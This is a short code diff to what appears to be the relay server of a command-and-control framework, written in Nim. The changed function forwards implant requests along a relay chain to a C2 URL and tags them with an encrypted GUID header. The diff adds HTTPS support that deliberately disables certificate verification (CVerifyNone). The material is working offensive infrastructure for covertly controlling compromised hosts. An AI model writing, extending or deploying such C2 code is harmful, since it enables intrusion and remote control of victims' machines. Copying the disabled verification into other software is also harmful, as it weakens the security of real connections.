@@ -4,7 +4,9 @@
     When chain ends, forwards directly to C2
 ]#
 
-import asyncdispatch, asynchttpserver, strutils, base64, httpclient
+import asyncdispatch, asynchttpserver, strutils, base64, httpclient, net
+when defined(ssl):
+    import openssl
 import ../util/crypto
 import ../config/configParser
 
@@ -128,8 +130,14 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
                 if relayGuid != "":
                     fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
             
-            # Create HTTP client and forward request
-            var client = newAsyncHttpClient()
+            # Create HTTP client with SSL context
+            var client: AsyncHttpClient
+            when defined(ssl):
+                # Create SSL context for HTTPS connections
+                let sslContext = newContext(verifyMode = CVerifyNone)
+                client = newAsyncHttpClient(sslContext = sslContext)
+            else:
+                client = newAsyncHttpClient()
             
             when defined debug:
                 echo "[RELAY] 📤 Sending request to: " & targetUrl
